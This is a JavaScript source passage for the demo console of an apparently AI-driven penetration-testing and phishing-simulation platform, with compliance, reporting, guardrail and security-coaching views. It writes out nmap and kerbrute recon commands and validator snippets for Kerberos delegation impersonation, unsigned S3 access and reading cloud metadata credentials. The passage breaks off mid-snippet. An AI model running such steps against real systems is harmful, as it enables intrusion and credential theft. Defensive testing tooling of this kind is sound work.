      '<div class="grid-2"><div class="card-p span2"><h3>Channel performance</h3><p class="sub">Engagement, credential capture, and report rate by channel</p>' +
      '<table class="tbl"><thead><tr><th>Channel</th><th>Targets</th><th>Engaged</th><th>Credentialed</th><th>Notable</th></tr></thead><tbody>' +
      state.social.map(function (s) {
        return '<tr><td>' + s[0] + '</td><td class="mono">' + s[1] + '</td><td><div class="kv" style="margin:0 0 5px"><span></span><b>' + s[2] + '%</b></div><div class="bar"><i style="width:' + s[2] + '%"></i></div></td><td class="mono">' + s[3] + '%</td><td class="st-mut">' + s[4] + '</td></tr>';
      }).join("") + '</tbody></table></div></div>';
  }

  function vCompliance() {
    return '<div class="view-head"><div><span class="eyebrow">Compliance</span><h1>Framework coverage</h1>' +
      '<p>Findings mapped in real time to every framework ' + ORG + ' is held to. One click exports the evidence pack.</p></div>' +
      '<div class="head-actions"><button class="btn-mini" data-export="One click audit pack (9 frameworks)">Generate audit pack</button></div></div>' +
      '<div class="heat">' + state.frameworks.map(function (f) {
        return '<div class="hcell ' + f[2] + '"><div class="nm">' + f[0] + '</div><div class="pct">' + f[1] + '%</div><div class="lbl">control coverage</div></div>';
      }).join("") + '</div>' +
      '<div class="card-p" style="margin-top:18px"><h3>How mapping works</h3><p class="sub">Every validated finding carries its control references</p>' +
      '<table class="tbl"><thead><tr><th>Finding</th><th>Severity</th><th>Mapped controls</th></tr></thead><tbody>' +
      state.findings.slice(0, 5).map(function (f) {
        return '<tr class="clk" data-f="' + f.id + '"><td>' + esc(f.t) + '</td><td>' + sevTag(f.sev) + '</td><td class="st-mut">' + (f.fw || []).join(" &middot; ") + '</td></tr>';
      }).join("") + '</tbody></table></div>';
  }

  function vReport() {
    return '<div class="view-head"><div><span class="eyebrow">Executive reporting</span><h1>Board pack</h1>' +
      '<p>One truth, told the way each room needs to hear it. Generated from the same campaigns that proved the findings.</p></div>' +
      '<div class="head-actions"><button class="btn-mini" data-export="Board pack (one page)">Export board pack</button><button class="btn-mini ghost sm" data-export="Auditor evidence">Export evidence</button></div></div>' +
      '<div class="grid-3"><div class="card-p"><h3>Posture</h3><p class="sub">Defensible, evidence backed</p><div class="flex-mid">' + gauge(state.posture, "of 100") + '</div></div>' +
      '<div class="card-p"><h3>Posture trend</h3><p class="sub">Last 10 weeks</p>' + spark(state.postureSeries, "#D6B066", 110) + '</div>' +
      '<div class="card-p"><h3>Residual risk</h3><p class="sub">Critical exposure over time</p>' + spark([9, 8, 8, 7, 6, 6, 5, 5, 4, 4], "#E0795A", 110) + '</div></div>' +
      '<div class="grid-2 even" style="margin-top:14px"><div class="card-p"><h3>Key metrics</h3><p class="sub">For the board</p>' +
      ['Mean time to validated proof|28 min|88', 'Critical findings, all proven|' + state.findings.filter(function (f) { return f.sev === "Critical"; }).length + '|30', 'Remediation rate|76%|76', 'Frameworks evidenced|9 of 9|100'].map(function (k) {
        var p = k.split("|"); return '<div class="kv"><span>' + p[0] + '</span><b>' + p[1] + '</b></div><div class="bar"><i style="width:' + p[2] + '%"></i></div>';
      }).join("") + '</div>' +
      '<div class="card-p"><h3>Decisions for the board</h3><p class="sub">Tied to owners and impact</p><table class="tbl"><tbody>' +
      '<tr><td>Isolate Jenkins, rotate svc_ci</td><td>' + sevTag("Critical") + '</td><td class="st-mut">Platform</td></tr>' +
      '<tr><td>Block public access on statement store</td><td>' + sevTag("Critical") + '</td><td class="st-mut">Cloud</td></tr>' +
      '<tr><td>Settlement invariant checks</td><td>' + sevTag("Critical") + '</td><td class="st-mut">Payments</td></tr>' +
      '<tr><td>Phishing resistant MFA rollout</td><td>' + sevTag("High") + '</td><td class="st-mut">IT Security</td></tr>' +
      '</tbody></table></div></div>';
  }

  function vConnectors() {
    var cats = {};
    state.connectors.forEach(function (c) { (cats[c[1]] = cats[c[1]] || []).push(c); });
    return '<div class="view-head"><div><span class="eyebrow">Integrations</span><h1>Connected stack</h1>' +
      '<p>Cherubim ingests from these connectors continuously. This is the surface every campaign can reach.</p></div>' +
      '<div class="head-actions"><button class="btn-mini ghost sm" data-toast="Connector catalogue|41 more integrations available">+ Add connector</button></div></div>' +
      '<div class="stat-row">' + statCard("Connectors", "14", "", "all healthy") + statCard("Surfaces covered", "7", "", "full stack") +
        statCard("Assets ingested", "1,284", "up", "continuous") + statCard("Last sync", "live", "", "streaming") + '</div>' +
      '<div class="card-p span2" style="margin-bottom:18px"><h3>API and CLI</h3><p class="sub">Everything you do in the console runs through a typed API. Drive it from your pipeline.</p>' +
      '<div class="code" style="white-space:pre"><span class="c"># launch an authorised engagement</span>\n$ cherubim campaign launch \\\n    --type assumed-breach \\\n    --scope cidr:10.4.0.0/16,domain:nw-corp.local,cloud:aws/nw-prod \\\n    --intensity 3 --concurrency 80 --window off-hours \\\n    --auth AUTH-2026-0519-NW --owner aaron.ang@hesedemet.asia\n<span class=\'ok\'>{ "id": "CMP-2046", "status": "queued", "url": "https://cherubim.hesedemet.asia/console/#/campaign/CMP-2046" }</span>\n\n<span class="c"># list validated criticals</span>\n$ cherubim findings list --severity Critical --campaign CMP-2046 --json | jq \'.[].id\'\n<span class=\'ot\'>"F-3301"\n"F-3302"\n"F-3303"</span>\n\n<span class="c"># export the audit pack, signed and chain-of-custody intact</span>\n$ cherubim audit export --campaign CMP-2046 --frameworks NIST,CyberTrust,ISO27001 --out ./audit.zip\n<span class=\'ok\'>[+] sealed audit.zip (sha256 8f3a...c2b1, 9 frameworks, 12 findings)</span>\n\n<span class="c"># webhook: stream events into your SOC</span>\n$ cherubim webhooks add https://soc.northwind.io/in/cherubim --events finding.proven,campaign.* --secret <span class=\'g\'>$NW_SECRET</span></div></div>' +
      Object.keys(cats).map(function (cat) {
        return '<h3 style="font-family:var(--sans);color:var(--paper);font-size:17px;margin:24px 0 12px;font-weight:500">' + cat + '</h3><div class="conn-grid">' +
          cats[cat].map(function (c) {
            return '<div class="conn"><div class="ct"><span class="cn">' + c[0] + '</span><span class="cs">&#9679; ' + c[2] + '</span></div>' +
              '<div class="cmeta">Scope <b>' + c[3] + '</b><br>Last sync <b>' + c[4] + '</b></div></div>';
          }).join("") + '</div>';
      }).join("");
  }

  function vSettings() {
    return '<div class="view-head"><div><span class="eyebrow">Engagement rules</span><h1>Guardrails and authorization</h1>' +
      '<p>Powerful by design, safe by obligation. These controls bound every campaign Cherubim runs.</p></div></div>' +
      '<div class="grid-2 even"><div class="card-p"><h3>Safety guardrails</h3><p class="sub">Enforced on every engagement</p>' +
      [['Authorization gate','No campaign starts without a signed, scoped authorization',true],
       ['Stop before real loss','Demonstrate the path, capture proof, never cause damage',true],
       ['Consent for cloned personas','Voice and likeness require explicit consent',true],
       ['Roster and exclusion lists','Targeting respects defined inclusion and exclusion',true],
       ['Stand down on distress','Social campaigns halt on distress signals',true],
       ['Watermarked synthetic media','All deepfake assets are watermarked and logged',true]].map(function (t) {
        return '<div class="toggle-row"><div>' + t[0] + '<small>' + t[1] + '</small></div><label class="sw"><input type="checkbox" ' + (t[2] ? "checked" : "") + ' disabled><span class="tk"></span></label></div>';
      }).join("") + '</div>' +
      '<div class="card-p"><h3>Default engagement window</h3><p class="sub">Applied unless overridden in the wizard</p>' +
      '<div class="frm"><label>Blackout windows</label><input type="text" value="Mon-Fri 09:00-18:00 SGT excluded" readonly></div>' +
      '<div class="frm"><label>Max concurrent agents</label><input type="text" value="120" readonly></div>' +
      '<div class="frm"><label>Data residency</label><input type="text" value="Singapore (ap-southeast-1)" readonly></div>' +
      '<div class="frm"><label>Evidence retention</label><input type="text" value="400 days, immutable, chain of custody" readonly></div>' +
      '<div class="frm"><label>Accountable owner</label><input type="text" value="Aaron Ang" readonly></div></div></div>' +
      '<div class="card-p span2" style="margin-top:14px"><h3>Audit ledger</h3><p class="sub">Append only, signed per line, exportable to your SIEM</p>' +
      '<div class="code" style="white-space:pre">' + auditLogLines() + '</div></div>';
  }
  function auditLogLines() {
    var rows = [
      ["09:11:38", "auth.signin", "aaron.ang@hesedemet.asia", "ok"],
      ["09:12:02", "campaign.launch", "CMP-2041 assumed breach, scope=cidr:10.4.0.0/16,cloud:aws/nw-prod", "ok"],
      ["09:12:09", "tool.call", "nmap -sV -p- 10.4.0.0/16 --open --min-rate 1500", "ok"],
      ["09:18:22", "tool.call", "kerbrute userenum -d nw-corp.local", "ok"],
      ["09:23:51", "validator.run", "F-3303 reproduced 3/3 in payments-sandbox-c4f1", "ok"],
      ["09:31:14", "channel.send", "118 emails dispatched on CMP-2044", "ok"],
      ["09:32:08", "distress.detected", "target=priya.n@northwind.io thread halted", "info"],
      ["09:41:00", "evidence.seal", "audit.zip sha256=8f3a...c2b1 hsm=cb-hsm-1", "ok"],
      ["09:41:02", "framework.map", "9 frameworks tagged for CMP-2041", "ok"]
    ];
    var hash = "1a4b9c7f";
    return rows.map(function (r) {
      hash = (parseInt(hash, 16) * 31 + r[1].length * 7).toString(16).padStart(8, "0").slice(-8);
      return "<span class='c'>[" + r[0] + " SGT]</span> <span class='gd'>" + r[1] + "</span> " + esc(r[2]) + " <span class='c'>sig=" + hash + "</span> <span class='ok'>" + r[3] + "</span>";
    }).join("\n");
  }

  /* ============================ COACHING ============================ */
  var LESSONS = [
    { id: "L01", t: "Spotting payment redirection fraud", topic: "Finance", min: 3, lvel: "Core", aud: "Finance, AP", tied: "Phishing and BEC",
      obj: ["Recognise a forged supplier or executive payment request", "Verify changes to bank details out of band", "Know the one step that stops the loss"],
      mod: ["Why finance is the target", "Three tells in a redirection email", "The call back rule", "Quick check before you pay"] },
    { id: "L02", t: "Verifying urgent executive requests", topic: "Executive", min: 4, lvel: "Core", aud: "All staff", tied: "BEC and deepfake",
      obj: ["Slow down on urgency and secrecy", "Confirm identity on a trusted channel", "Escalate without fear of getting it wrong"],
      mod: ["The urgency trap", "Voice and video can lie now", "Your verification playbook", "Reporting in 30 seconds"] },
    { id: "L03", t: "Phishing link red flags", topic: "Phishing", min: 3, lvel: "Core", aud: "All staff", tied: "Phishing email",
      obj: ["Read a link before you click", "Spot lookalike domains", "Use the report button"],
      mod: ["Hover, read, decide", "Lookalike domains", "Attachments and QR codes", "Report and move on"] },
    { id: "L04", t: "MFA fatigue and push bombing", topic: "Identity", min: 3, lvel: "Core", aud: "All staff", tied: "Identity",
      obj: ["Understand why approvals get spammed", "Never approve a prompt you did not start", "Move to phishing resistant MFA"],
      mod: ["What push bombing feels like", "Deny and report", "Number matching", "Passkeys explained"] },
    { id: "L05", t: "Voice clone and vishing awareness", topic: "Voice", min: 4, lvel: "Core", aud: "Finance, Helpdesk", tied: "Vishing",
      obj: ["Know that a familiar voice can be cloned", "Resist pressure on a call", "Verify before you act"],
      mod: ["How voice cloning works", "Pressure tactics on calls", "The safe word and call back", "When to hang up"] },
    { id: "L06", t: "Deepfake video on calls", topic: "Deepfake", min: 5, lvel: "Advanced", aud: "Executives, Finance", tied: "Live deepfake",
      obj: ["Understand live face and voice synthesis", "Use liveness checks in a meeting", "Confirm high risk actions off the call"],
      mod: ["Deepfakes in meetings", "Liveness checks that work", "Out of band confirmation", "Reporting a suspected fake"] },
    { id: "L07", t: "Helpdesk identity verification", topic: "Process", min: 5, lvel: "Advanced", aud: "IT Helpdesk", tied: "Helpdesk",
      obj: ["Apply strict verification before reset", "Detect social pressure and pretext", "Follow the MFA recovery policy"],
      mod: ["The helpdesk is a target", "Verify the human", "Resisting urgency", "Recovery done right"] },
    { id: "L08", t: "Handling sensitive data and PDPA basics", topic: "Data", min: 4, lvel: "Core", aud: "All staff", tied: "Data handling",
      obj: ["Classify what you hold", "Share on approved channels only", "Report a possible exposure quickly"],
      mod: ["What counts as personal data", "Safe sharing", "Storage and retention", "If something leaks"] },
    { id: "L09", t: "Passwords and passkeys", topic: "Identity", min: 3, lvel: "Core", aud: "All staff", tied: "Credentials",
      obj: ["Stop reusing passwords", "Use a manager and passkeys", "Recognise credential capture pages"],
      mod: ["Why reuse is fatal", "Managers and passkeys", "Spotting a fake login page", "Recover an account safely"] },
    { id: "L10", t: "Secrets in CI and code", topic: "Engineering", min: 6, lvel: "Advanced", aud: "Engineering", tied: "Supply chain",
      obj: ["Keep secrets out of repos and logs", "Use short lived tokens", "Rotate and alert on exposure"],
      mod: ["Where secrets leak", "Short lived OIDC tokens", "Scanning and pre commit", "Rotation and response"] },
    { id: "L11", t: "Cloud least privilege basics", topic: "Cloud", min: 5, lvel: "Advanced", aud: "Cloud, Platform", tied: "Cloud",
      obj: ["Scope roles to the task", "Avoid wildcard permissions", "Protect the metadata service"],
      mod: ["Blast radius", "Right sizing roles", "IMDSv2 and network policy", "Reviewing access"] },
    { id: "L12", t: "Report it fast", topic: "Reporting", min: 2, lvel: "Core", aud: "All staff", tied: "All",
      obj: ["Find the report button", "Know what to include", "Understand there is no penalty for reporting"],
      mod: ["One button, one minute", "What helps the team", "No blame, ever"] }
  ];

  var coachCfg = {
    channel: "Microsoft Teams",
    trigger: "When a learner falls for a security test",
    timing: "Within 5 minutes",
    cadence: "Once, then a 30 day refresher",
    campaign: "CMP-2044",
    audience: "Affected learners only",
    maxWeek: 2,
    managerCc: false,
    language: "Learner's preference"
  };
  var coachEnroll = [
    ["Priya N.", "Clicked a phishing link", "L03", "Microsoft Teams", "Completed", "2 days ago"],
    ["Marcus T.", "Entered credentials on capture page", "L09", "Microsoft Teams", "In progress", "today"],
    ["Wei L.", "Approved an MFA prompt", "L04", "Slack", "Sent", "today"],
    ["Helpdesk team", "Reset without verification", "L07", "Outlook", "Assigned", "today"],
    ["Lena T. (CFO)", "Joined a deepfake test call", "L06", "Microsoft Teams", "Completed", "1 week ago"]
  ];

  function lessonById(id) { return LESSONS.filter(function (l) { return l.id === id; })[0]; }

  function deliveryPreview(lesson) {
    var first = "Priya", ch = coachCfg.channel;
    var line = "During a recent security exercise a risky message slipped past. Here is a " + lesson.min + " minute refresher so the next one does not. No blame, just a quick win.";
    if (ch === "Slack") {
      return '<div class="dp dp-slack"><div class="dp-h"><span class="dp-logo sl">#</span><div><b>Cherubim Coach</b><span>app &middot; security-coaching</span></div></div>' +
        '<div class="dp-b"><b>Hi ' + first + '</b><p>' + line + '</p><div class="dp-card"><b>' + esc(lesson.t) + '</b><span>' + lesson.min + ' min &middot; ' + lesson.lvel + '</span><div class="dp-btn">Start lesson</div></div></div></div>';
    }
    if (ch === "Outlook" || ch === "Email") {
      return '<div class="dp dp-mail"><div class="dp-mh"><div class="dp-av">C</div><div><b>Cherubim Coach</b><span>coach@northwind.io</span></div></div>' +
        '<div class="dp-subj">A 3 minute win after today\'s security check</div><div class="dp-b"><b>Hi ' + first + '</b><p>' + line + '</p><div class="dp-btn">Start the ' + lesson.min + ' min lesson</div><p class="dp-fine">Sent by your security team. Replies are not monitored.</p></div></div>';
    }
    if (ch === "SMS") {
      return '<div class="dp dp-sms"><div class="dp-bubble">Northwind Security: nice catch opportunity. A ' + lesson.min + ' min refresher on ' + lesson.topic.toLowerCase() + ' is ready: nw.io/learn/' + lesson.id + '</div><span class="dp-time">delivered</span></div>';
    }
    return '<div class="dp dp-teams"><div class="dp-h"><span class="dp-logo tm">T</span><div><b>Cherubim Coach</b><span>Microsoft Teams &middot; Chat</span></div></div>' +
      '<div class="dp-b"><b>Hi ' + first + '</b><p>' + line + '</p><div class="dp-card"><b>' + esc(lesson.t) + '</b><span>' + lesson.min + ' min &middot; ' + lesson.lvel + ' &middot; ' + lesson.topic + '</span><div class="dp-btn">Start lesson</div></div></div></div>';
  }

  var coachPreviewId = "L03";
  function vCoaching() {
    var topics = ["All"]; LESSONS.forEach(function (l) { if (topics.indexOf(l.topic) < 0) topics.push(l.topic); });
    var done = coachEnroll.filter(function (e) { return e[4] === "Completed"; }).length;
    return '<div class="view-head"><div><span class="eyebrow">Human resilience</span><h1>Blame-free coaching</h1>' +
      '<p>Turn a moment someone slips into a two minute win. Load lessons, choose how and when they reach people, and deliver bite-size training on the channels they already use.</p></div>' +
      '<div class="head-actions"><button class="btn-mini" id="coachAssignAll">Coach affected learners</button></div></div>' +
      '<div class="stat-row">' + statCard("Lessons in library", LESSONS.length, "", "ready to deliver") +
        statCard("Learners coached", "486", "up", "this quarter") +
        statCard("Completion rate", "91%", "up", "median 3 min") +
        statCard("Repeat failures", "down 38%", "down", "after coaching") + '</div>' +
      '<div class="grid-2"><div class="card-p"><h3>Coaching library</h3><p class="sub">Click a lesson to preview the content and how it lands</p>' +
      '<div class="chips" id="coachChips">' + topics.map(function (t, i) { return '<span class="chip' + (i === 0 ? " on" : "") + '" data-ct="' + t + '">' + t + '</span>'; }).join("") + '</div>' +
      '<table class="tbl"><thead><tr><th>Lesson</th><th>Topic</th><th>Length</th><th>Audience</th></tr></thead><tbody id="lessonBody"></tbody></table></div>' +
      '<div class="card-p"><h3>Delivery</h3><p class="sub">How, when and to whom. Defaults are scoped to the selected campaign so nobody is over messaged.</p>' +
      '<div class="frm"><label>Channel</label><select id="cfChannel">' + ["Microsoft Teams", "Slack", "Outlook", "SMS"].map(function (o) { return '<option ' + (coachCfg.channel === o ? "selected" : "") + '>' + o + '</option>'; }).join("") + '</select></div>' +
      '<div class="frm"><label>Trigger</label><select id="cfTrigger">' + ["When a learner falls for a security test", "When a learner clicks a link", "When a learner enters credentials", "On a fixed monthly cadence", "Manually assigned"].map(function (o) { return '<option ' + (coachCfg.trigger === o ? "selected" : "") + '>' + o + '</option>'; }).join("") + '</select></div>' +
      '<div class="frm"><label>Timing</label><select id="cfTiming">' + ["Within 5 minutes", "At end of day", "Next morning", "Within the hour"].map(function (o) { return '<option ' + (coachCfg.timing === o ? "selected" : "") + '>' + o + '</option>'; }).join("") + '</select></div>' +
      '<div class="frm"><label>Source campaign</label><select id="cfCampaign">' + state.campaigns.map(function (c) { return '<option value="' + c.id + '" ' + (coachCfg.campaign === c.id ? "selected" : "") + '>' + c.id + ' &middot; ' + esc(c.name) + '</option>'; }).join("") + '</select></div>' +
      '<div class="frm"><label>Audience</label><select id="cfAudience">' + ["Affected learners only", "Affected learners and their team", "Whole department", "Entire roster"].map(function (o) { return '<option ' + (coachCfg.audience === o ? "selected" : "") + '>' + o + '</option>'; }).join("") + '</select></div>' +
      '<div class="frm"><label>Frequency cap <span class="range-val" id="cfMaxL">' + coachCfg.maxWeek + ' lessons / learner / week</span></label><input type="range" id="cfMax" min="1" max="5" value="' + coachCfg.maxWeek + '"></div>' +
      '<div class="toggle-row"><div>Copy the line manager<small>Share completion only, never the mistake</small></div><label class="sw"><input type="checkbox" id="cfMgr" ' + (coachCfg.managerCc ? "checked" : "") + '><span class="tk"></span></label></div>' +
      '<div style="margin-top:16px;display:flex;gap:10px"><button class="btn-mini" id="cfSave">Save delivery policy</button><button class="btn-mini ghost sm" id="cfTest">Send myself a preview</button></div>' +
      '<h5 style="font-family:var(--mono);font-size:11px;letter-spacing:.16em;text-transform:uppercase;color:var(--gold);margin:22px 0 12px">What the learner receives</h5>' +
      '<div id="coachPrev">' + deliveryPreview(lessonById(coachPreviewId)) + '</div>' +
      '</div></div>' +
      '<div class="card-p span2" style="margin-top:14px"><h3>Active coaching</h3><p class="sub">Live status across learners. No blame is ever recorded against an individual.</p>' +
      '<table class="tbl"><thead><tr><th>Learner</th><th>What happened</th><th>Lesson</th><th>Channel</th><th>Status</th><th>Updated</th></tr></thead><tbody id="enrollBody">' + enrollRows() + '</tbody></table></div>';
  }
  function enrollRows() {
    return coachEnroll.map(function (e) {
      var st = e[4] === "Completed" ? "st-ok" : e[4] === "In progress" ? "st-run" : "st-mut";
      var l = lessonById(e[2]);
      return '<tr class="clk" data-lesson="' + e[2] + '"><td>' + esc(e[0]) + '</td><td class="st-mut">' + esc(e[1]) + '</td><td>' + (l ? esc(l.t) : e[2]) + '</td><td>' + e[3] + '</td><td class="' + st + '">' + e[4] + '</td><td class="st-mut">' + e[5] + '</td></tr>';
    }).join("");
  }
  function fillLessons(topic) {
    var list = (!topic || topic === "All") ? LESSONS : LESSONS.filter(function (l) { return l.topic === topic; });
    $("#lessonBody").innerHTML = list.map(function (l) {
      return '<tr class="clk" data-lesson="' + l.id + '"><td>' + esc(l.t) + '</td><td>' + l.topic + '</td><td class="mono">' + l.min + ' min</td><td class="st-mut">' + l.aud + '</td></tr>';
    }).join("");
    $$("#lessonBody tr.clk").forEach(function (r) { r.onclick = function () { openLesson(r.getAttribute("data-lesson")); }; });
  }
  function openLesson(id) {
    var l = lessonById(id); if (!l) return;
    $("#drawerBody").innerHTML =
      '<button class="x" data-x>&times;</button>' +
      '<span style="font-family:var(--mono);color:var(--gold);font-size:11px;letter-spacing:.16em">[ ' + l.id + ' &middot; ' + l.topic + ' ]</span>' +
      '<h3>' + esc(l.t) + '</h3>' +
      '<div class="meta"><span class="tag sev-med">' + l.min + ' min</span><span class="tag sev-low">' + l.lvel + '</span><span class="tag sev-low">' + l.aud + '</span><span class="tag" style="border:1px solid var(--line);color:var(--gold-soft)">Triggers on ' + l.tied + '</span></div>' +
      '<h5>What the learner will be able to do</h5><ul class="feature-list">' + l.obj.map(function (o) { return '<li>' + esc(o) + '</li>'; }).join("") + '</ul>' +
      '<h5>Lesson modules</h5><div class="plan">' + l.mod.map(function (mname, i) { return '<div class="plan-task"><span class="dotp ok"></span><span>' + (i + 1) + '. ' + esc(mname) + '</span><span class="st-mut mono">' + (i === 0 ? "intro" : i === l.mod.length - 1 ? "wrap up" : "micro") + '</span></div>'; }).join("") + '</div>' +
      '<h5>How it lands on ' + coachCfg.channel + '</h5>' + deliveryPreview(l) +
      '<div style="display:flex;gap:10px;margin-top:22px"><button class="btn-mini" data-assign="' + l.id + '">Assign to affected learners</button><button class="btn-mini ghost sm" data-prevset="' + l.id + '">Set as preview</button></div>';
    $("#scrim").classList.add("open"); $("#drawer").classList.add("open");
    $("[data-x]").onclick = function () { $("#scrim").classList.remove("open"); $("#drawer").classList.remove("open"); };
    $("[data-assign]").onclick = function () { assignLesson(l.id); };
    $("[data-prevset]").onclick = function () { coachPreviewId = l.id; var p = $("#coachPrev"); if (p) p.innerHTML = deliveryPreview(l); toast("Preview updated", esc(l.t) + " shown as it lands on " + coachCfg.channel + "."); };
  }
  function assignLesson(id) {
    var l = lessonById(id);
    coachEnroll.unshift(["Affected learners (" + (6 + Math.floor(Math.random() * 18)) + ")", "From " + coachCfg.campaign, id, coachCfg.channel, "Sent", "just now"]);
    var b = $("#enrollBody"); if (b) b.innerHTML = enrollRows();
    bindEnroll();
    toast("Coaching assigned", esc(l.t) + " is on its way via " + coachCfg.channel + ", " + coachCfg.timing.toLowerCase() + ".");
  }
  function bindEnroll() { $$("#enrollBody tr.clk").forEach(function (r) { r.onclick = function () { openLesson(r.getAttribute("data-lesson")); }; }); }
  function bindCoaching() {
    fillLessons("All");
    bindEnroll();
    var chips = $("#coachChips");
    if (chips) $$(".chip", chips).forEach(function (c) { c.onclick = function () { $$(".chip", chips).forEach(function (x) { x.classList.remove("on"); }); c.classList.add("on"); fillLessons(c.getAttribute("data-ct")); }; });
    function refreshPrev() { var p = $("#coachPrev"); if (p) p.innerHTML = deliveryPreview(lessonById(coachPreviewId)); }
    var ch = $("#cfChannel"); if (ch) ch.onchange = function () { coachCfg.channel = ch.value; refreshPrev(); };
    var tg = $("#cfTrigger"); if (tg) tg.onchange = function () { coachCfg.trigger = tg.value; };
    var tm = $("#cfTiming"); if (tm) tm.onchange = function () { coachCfg.timing = tm.value; };
    var cm = $("#cfCampaign"); if (cm) cm.onchange = function () { coachCfg.campaign = cm.value; };
    var au = $("#cfAudience"); if (au) au.onchange = function () { coachCfg.audience = au.value; };
    var mx = $("#cfMax"); if (mx) mx.oninput = function () { coachCfg.maxWeek = +mx.value; $("#cfMaxL").textContent = mx.value + " lessons / learner / week"; };
    var mg = $("#cfMgr"); if (mg) mg.onchange = function () { coachCfg.managerCc = mg.checked; };
    var sv = $("#cfSave"); if (sv) sv.onclick = function () { toast("Delivery policy saved", "Coaching will deliver on " + coachCfg.channel + ", " + coachCfg.timing.toLowerCase() + ", for " + coachCfg.audience.toLowerCase() + " of " + coachCfg.campaign + "."); };
    var ts = $("#cfTest"); if (ts) ts.onclick = function () { toast("Preview sent", "A sample lesson was sent to you on " + coachCfg.channel + "."); };
    var aa = $("#coachAssignAll"); if (aa) aa.onclick = function () { assignLesson(coachPreviewId); };
  }

  /* ============================ ROUTER ============================ */
  var views = {
    overview: vOverview, campaigns: vCampaigns, campaign: vCampaign, surface: vSurface, paths: vPaths, agents: vAgents,
    findings: vFindings, social: vSocial, coaching: vCoaching, compliance: vCompliance, report: vReport, connectors: vConnectors, settings: vSettings
  };
  var tickerIv;
  function route() {
    var h = (location.hash || "#/overview").replace("#/", ""), parts = h.split("/"), key = parts[0] || "overview";
    if (!views[key]) key = "overview";
    Object.keys(views).forEach(function (v) {
      var el = $("#v-" + v); if (el) el.classList.remove("active");
    });
    var el = $("#v-" + key);
    el.innerHTML = views[key](parts[1]);
    el.classList.add("active");
    $$(".nav-item").forEach(function (n) { n.classList.toggle("active", n.getAttribute("data-r") === key); });
    if ($("#side")) $("#side").classList.remove("open");
    window.scrollTo(0, 0);
    clearInterval(tickerIv);
    if (key === "overview") { animateGauges(); startTicker(); }
    if (key === "report") animateGauges();
    if (key === "findings") fillFindings("All");
    if (key === "coaching") bindCoaching();
    bindClicks();
    $("#viewWrap").scrollIntoView ? null : null;
  }
  function animateGauges() {
    setTimeout(function () {
      $$("circle[data-off]").forEach(function (c) { c.style.strokeDashoffset = c.getAttribute("data-off"); });
    }, 80);
  }

  /* ============================ TICKER ============================ */
  var activity = [
    ["agent.recon", "mapped 1,284 assets across 7 surfaces"],
    ["agent.web", "confirmed business logic flaw on payments.northwind.io"],
    ["validator", "reproduced F-3303 in isolated sandbox (3x)"],
    ["agent.identity", "recovered service credential from CI logs"],
    ["agent.cloud", "assumed node role via IMDS on nw-prod-eks"],
    ["narrative.engine", "escalated vishing scenario on engagement"],
    ["agent.network", "proved guest VLAN reaches corporate subnet"],
    ["compliance.map", "tagged F-3301 to NIST PR.AC and Cyber Trust"],
    ["validator", "marked F-3306 PROVEN, evidence pack updated"],
    ["agent.identity", "reached Domain Admin, campaign stopped safely"]
  ];
  function startTicker() {
    var box = $("#ticker"); if (!box) return;
    box.innerHTML = ""; var i = 0;
    function add() {
      var t = new Date(Date.now() - (8 - (i % 8)) * 3000).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" });
      var a = activity[i % activity.length], ln = document.createElement("div");
      ln.className = "ln";
      ln.innerHTML = '<span class="t">' + t + '</span><span><b>' + a[0] + '</b> ' + a[1] + '</span>';
      box.insertBefore(ln, box.firstChild);
      while (box.children.length > 8) box.removeChild(box.lastChild);
      i++;
    }
    for (var k = 0; k < 7; k++) add();
    tickerIv = setInterval(add, 3200);
  }

  /* ============================ DRAWER ============================ */
  function fakeHash(seed) {
    var h = 0, s = String(seed) + "::cherubim::validator";
    for (var i = 0; i < s.length; i++) { h = ((h << 5) - h + s.charCodeAt(i)) | 0; }
    var out = "", x = Math.abs(h);
    for (var j = 0; j < 64; j++) { out += "0123456789abcdef"[(x >>> (j % 24)) & 15]; x = (x * 31 + 7) | 0; }
    return out;
  }
  function validatorFor(f) {
    var base = "// validator/" + f.id.toLowerCase() + ".ts  (sandboxed, deterministic)\n" +
      "<span class='c'>import { sandbox, expect, seal } from \"@cherubim/validator\";</span>\n" +
      "<span class='c'>export const schema = {</span>\n" +
      "  id: \"" + f.id + "\",\n" +
      "  attck: \"" + f.att + "\",\n" +
      "  surface: \"" + f.surf + "\",\n" +
      "  inputs: { capture: \"agent.web|agent.identity|agent.cloud\", scope: \"engagement.scope\" },\n" +
      "  outputs: { reproduced: \"boolean\", evidence: \"artifact\" }\n" +
      "<span class='c'>} as const;</span>\n\n";
    var body;
    if (/T1190/.test(f.att) && /settle|payments|logic/i.test(f.t)) {
      body = "<span class='c'>export async function run(ctx) {</span>\n" +
        "  const tenant = await sandbox.clone(ctx.target, { isolated: true });\n" +
        "  const req = ctx.capture.request; // POST /api/v2/settle\n" +
        "  req.body = { amount: <span class='g'>-50000</span>, acct: \"sandbox-c4f1\" };\n" +
        "  const res = await tenant.send(req);\n" +
        "  expect(res.status).toBe(200);\n" +
        "  expect(res.json.delta).toBe(<span class='g'>-50000</span>); <span class='c'>// ledger inverted</span>\n" +
        "  return seal({ reproduced: true, evidence: res.captureChain() });\n" +
        "<span class='c'>}</span>";
    } else if (/T1078|T1556/.test(f.att)) {
      body = "<span class='c'>export async function run(ctx) {</span>\n" +
        "  const ad = await sandbox.cloneDirectory(ctx.target.domain);\n" +
        "  const tgt = await ad.kerberos.s4u2self({ user: \"svc_ci\", impersonate: \"Administrator\" });\n" +
        "  const tgs = await ad.kerberos.s4u2proxy({ tgt, spn: \"HTTP/dc1.\" + ad.fqdn });\n" +
        "  expect(tgs.principal).toEqual(\"Administrator@\" + ad.fqdn.toUpperCase());\n" +
        "  return seal({ reproduced: true, evidence: ad.captureChain() });\n" +
        "<span class='c'>}</span>";
    } else if (/T1530/.test(f.att)) {
      body = "<span class='c'>export async function run(ctx) {</span>\n" +
        "  const objs = await ctx.aws.s3.list(ctx.target.bucket, { signing: false, sample: 5 });\n" +
        "  expect(objs.length).toBeGreaterThan(0);\n" +
        "  const head = await ctx.aws.s3.head(objs[0].key, { signing: false });\n" +
        "  expect(head.status).toBe(200);\n" +
        "  return seal({ reproduced: true, evidence: { sample: objs.length, removed: 0 } });\n" +
        "<span class='c'>}</span>";
    } else if (/T1552/.test(f.att)) {
      body = "<span class='c'>export async function run(ctx) {</span>\n" +
        "  const pod = ctx.k8s.exec(\"payments-7f4-2x9k\", \"payments\");\n" +
        "  const role = await pod.curl(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\");\n" +
